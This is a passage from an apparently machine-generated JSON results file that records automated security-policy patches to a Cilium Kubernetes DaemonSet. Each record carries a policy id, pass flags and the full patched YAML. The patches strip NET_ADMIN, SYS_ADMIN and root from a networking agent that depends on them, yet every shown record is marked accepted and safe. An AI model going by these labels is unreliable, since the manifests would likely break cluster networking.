    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00945",
    "policy_id": "no_privileged",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00946",
    "policy_id": "no_privileged",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00947",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00948",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00949",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
